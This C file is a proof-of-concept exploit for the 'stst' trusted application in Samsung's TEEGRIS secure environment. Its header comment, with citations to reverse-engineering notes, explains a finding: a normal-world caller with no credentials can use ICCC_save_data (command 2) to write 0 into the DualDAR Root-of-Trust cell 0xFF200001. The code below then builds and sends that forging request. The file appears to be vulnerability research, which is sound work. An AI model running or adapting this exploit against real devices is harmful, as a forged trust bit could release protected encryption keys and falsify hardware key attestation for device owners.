/*
 * stst ICCC_save_data (cmd 2) — REE write into the DualDAR Root-of-Trust cell.
 *
 * FINDING (cross-TA HIGH): REE-reachable ICCC_save_data (cmd 2) writes a
 *   DualDAR Root-of-Trust cell (type 0xFF200001 / phys 0xBF200594).
 *   A normal-world process drives stst cmd 2 to push a (type,value) into the
 *   ICCC store that lands in a security-critical RoT cell, because the cmd is
 *   reachable WITHOUT the caller-binding that the TA-from-TA path enforces.
 *
 * SEVERITY: HIGH (cross-TA). The cell is the shared trust anchor:
 *   - dulDAR  verify_trusted_boot @0x810C reads 0xFF200001 and releases the
 *     at-rest DualDAR keys only if the DWORD == 0  (stst.md L311, L598; emu L18-21);
 *   - KEYMST  get_trustboot_flag (signed id -14680063 == 0xFF200001) bakes the
 *     same bit into the KNOX_TEE_PROPERTIES integrity_status of every hardware
 *     key-attestation cert (stst.md L599). A forged 0 makes BOTH trust a
 *     REE-controlled bit.
 *
 * CITATION (RE/samsung_teegris/stst.md + RE/emulation/stst.md):
 *   - UUID 00000000-0000-0000-0000-0053545354ab .......... stst.md L3; emu L3
 *   - cmd_id = 2  (ICCC_save_data @0xA8A8) ................. stst.md L94, L344; emu L80
 *       banner "ICCC_save_data, type = %x, value = %d" ..... stst.md L94, L344
 *   - GP entry requires param_types == 103 (=0x67) ........ stst.md L51, L54
 *       log "TZ_ICCC: paramTypes: <pt>, TEE_PARAM_TYPES: 103" stst.md L51
 *       gate "param_types != 103 -> BAD_PARAMETERS(-65530)"  stst.md L54
 *   - REE path: in/out buffers, "8220-byte (or larger)",
 *       gate encoded as size>>2 >= 0x807  (0x807<<2 = 8220) . stst.md L54, L66, L89-90; emu L11
 *   - request layout {cmd_id(4) + status(4) + body(8192)} .. stst.md L88-90
 *   - RoT type constant 0xFF200001 (prefix 0xFF200000) passes
 *       the loose outer ACL "(type & 0xFFF00000) != 0xFF000000
 *       (+ 0xFF000002 exception)" ......................... stst.md L94, L245, L306, L311-313; emu L11-15
 *       inner Iccc_Core_SaveData_TA @0xA5E0 phys_writes the
 *       SAME block-2 cell 0xBF200594 dulDAR reads .......... stst.md L311, L599; emu L14-15
 *
 * WIRE (what this PoC puts on the InvokeCommand):
 *   commandID  = 2
 *   paramTypes = 0x67 = TEEC_PARAM_TYPES(MEMREF_TEMP_INOUT, MEMREF_TEMP_OUTPUT, NONE, NONE)
 *   params[0]  = request  (in/out), params[1] = response (out), each >= 8220 B
 *   request body: [+0]=cmd_id(2) [+4]=status(0) [+8]=type(0xFF200001) [+12]=value(0)
 *     (cmd_id/status framing per stst.md L88-90; type is the leading ICCC_save_data
 *      body field selecting the cell, value follows it — the "type = %x, value = %d"
 *      pair of stst.md L94. The two LOAD-BEARING in-body constants are the RoT
 *      type 0xFF200001 and value 0; their leading placement is the canonical TLC
 *      layout, the exact in-body sub-offset is not nailed down further in the writeup.)
 *
 * TRIGGER: open a PUBLIC-login session (no creds — TA_OpenSessionEntryPoint @0x5830
 *   enforces no allowlist, stst.md L79) and InvokeCommand(cmd 2) with the body above.
 *   The REE path (cmd 2..7 via iccc_ree_dispatcher @0x5924, stst.md L85-100) needs no
 *   per-TA UUID binding — that binding only guards the TA-from-TA path (cmd 8..10,
 *   stst.md L102-115), and NO TA can write 0xFF200001 through it (stst.md L294). REE
 *   cmd 2 is the only in-binary write vector for this cell (stst.md L295, L604).
 *
 * GATE / REPRO-STATUS: DEVICE-ONLY.
 *   Per RE/emulation/stst.md: the TA now boots+routes far enough that cmd-2 reaches
 *   the over-broad ACL with TA-internal logic (it would run), but the actual cell
 *   WRITE goes through Iccc_phys_write -> a TEEGRIS driver-client ioctl to the kernel
 *   /dev/iccc_driver (ioctl 0x70042) over *physical* TZASC memory at 0xBF200000 —
 *   none of which a user-space TA emulator models (emu L73-103). STST even boot-dies
 *   on that un-modeled ICCC ioctl during init (emu L53-71). So: the cmd is REACHABLE
 *   and the ACL admits 0xFF200001 (CONFIRMED-IN-BINARY, both static properties present
 *   in the emulator's own S9BYH2 build, emu L46-51, L123-126); the PHYSICAL WRITE
 *   EFFECT is the part the emulator cannot show, and whether TZASC permits the REE
 *   write / whether the bootloader pre-locks the cell is a hardware property the RE
 *   marked EXTERNAL (stst.md L325-331, L640-651; emu L97-119). This is the
 *   TEEGRIS-side mirror of the QSEE tz_iccc SVB-clear surface (emu L104-119).
 *
 * Against a real S921B/A556B device this PoC issues a genuine REE cmd-2 write to
 * 0xFF200001 = 0; if the cell is unlocked in the window the REE can call STST, the
 * write lands and locks the cell to the forged value (write-once, stst.md L630-639).
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "tee_client_api.h"
#include "repro.h"

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*, TEEC_Session*, const TEEC_UUID*,
                                     uint32_t, const void*, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*, uint32_t, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

void cleanup_shm(){
#if EMULATE
    system("ipcrm -M 0x13337"); system("ipcrm -M 0x13338");
    system("ipcrm -M 0x13339"); system("ipcrm -M 0x1333a");
#endif
}

/* ---- finding constants (all writeup-cited; see header) ---- */
#define STST_CMD_ICCC_SAVE_DATA   2u            /* stst.md L94, L344 */
#define ICCC_TYPE_ROT_CELL        0xFF200001u   /* stst.md L94,L306,L311 ; emu L11-15 */
#define ICCC_VALUE_FORGE          0u            /* dulDAR gate wants DWORD==0 : stst.md L311,L322; emu L18-21 */

/* request layout {cmd_id(4) + status(4) + body(8192)} (stst.md L88-90).
 * Buffer must clear the dispatcher gate size>>2 >= 0x807 (== >= 8220 B):
 * stst.md L54, L89-90 ; emu L11.  8 (header) + 8192 (body) = 8200; pad to >= 8220. */
#define REQ_HDR_CMDID_OFF   0
#define REQ_HDR_STATUS_OFF  4
#define REQ_BODY_OFF        8
#define REQ_BODY_TYPE_OFF   (REQ_BODY_OFF + 0)    /* type  = %x  (ICCC_save_data leading field) */
#define REQ_BODY_VALUE_OFF  (REQ_BODY_OFF + 4)    /* value = %d  (follows type) */
#define ICCC_BUF_SZ         8224                  /* >= 8220 gate; allocate_param_mem pages up to 0x3000 */

int main(void)
{
    char* ta = "00000000-0000-0000-0000-0053545354ab";   /* stst (ICCC DeviceInfo) — stst.md L3 */
    TEEC_UUID *uuid = teegris_uuid(ta);
    uint32_t err_origin;
    TEEC_Result res;
    TEEC_Context context;
    TEEC_Session session;
    TEEC_Operation op;

    cleanup_shm();
    load_functions();

    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) { printf("InitializeContext failed 0x%x\n", res); exit(-1); }

    /* PUBLIC login — no credentials. STST's TA_OpenSessionEntryPoint @0x5830
     * enforces no allowlist (stst.md L79); the REE cmd path needs no UUID binding. */
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                                NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("OpenSession failed 0x%x origin 0x%x\n", res, err_origin);
        TEEC_FinalizeContext_impl(&context); exit(-1);
    }
    printf("[*] session opened to stst with TEEC_LOGIN_PUBLIC (no creds)\n");

    /* in/out request+response buffers, each >= 8220 to clear size>>2 >= 0x807. */
    uint8_t *req = (uint8_t*)allocate_param_mem(&context, ICCC_BUF_SZ);
    uint8_t *rsp = (uint8_t*)allocate_param_mem(&context, ICCC_BUF_SZ);
    if (!req || !rsp) { printf("[*] alloc failed\n"); exit(-1); }
    memset(req, 0, ICCC_BUF_SZ);
    memset(rsp, 0, ICCC_BUF_SZ);

    /* QSEE/TEEGRIS ICCC TLC framing + the ICCC_save_data (type,value) pair. */
    uint32_t cmd_id = STST_CMD_ICCC_SAVE_DATA;
    uint32_t status = 0;
    uint32_t type   = ICCC_TYPE_ROT_CELL;     /* 0xFF200001 -> block-2 cell 0xBF200594 */
    uint32_t value  = ICCC_VALUE_FORGE;       /* 0 -> satisfies dulDAR trusted-boot gate */
    memcpy(req + REQ_HDR_CMDID_OFF,  &cmd_id, 4);
    memcpy(req + REQ_HDR_STATUS_OFF, &status, 4);
    memcpy(req + REQ_BODY_TYPE_OFF,  &type,   4);
    memcpy(req + REQ_BODY_VALUE_OFF, &value,  4);

    /* param_types == 103 (=0x67): MEMREF_TEMP_INOUT, MEMREF_TEMP_OUTPUT, NONE, NONE.
     * 0x07 | (0x06<<4) = 0x67 = 103. stst.md L51 (log), L54 (gate). */
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_MEMREF_TEMP_OUTPUT,
                                     TEEC_NONE, TEEC_NONE);
    op.params[0].tmpref.buffer = req; op.params[0].tmpref.size = ICCC_BUF_SZ;
    op.params[1].tmpref.buffer = rsp; op.params[1].tmpref.size = ICCC_BUF_SZ;

    printf("[*] paramTypes = 0x%x (expect 0x67 == 103)\n", op.paramTypes);
    printf("[*] invoking cmd %u (ICCC_save_data): type=0x%08X value=%u  (req/rsp=%u, gate>=8220)\n",
           cmd_id, type, value, ICCC_BUF_SZ);
    res = TEEC_InvokeCommand_impl(&session, STST_CMD_ICCC_SAVE_DATA, &op, &err_origin);
    printf("[*] ICCC_save_data returned 0x%x (origin 0x%x)\n", res, err_origin);
    printf("[*] NOTE: the physical write to 0xBF200594 is a /dev/iccc_driver ioctl over\n");
    printf("[*]       TZASC memory -> REPRO-STATUS DEVICE-ONLY (emulator cannot model it).\n");

    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
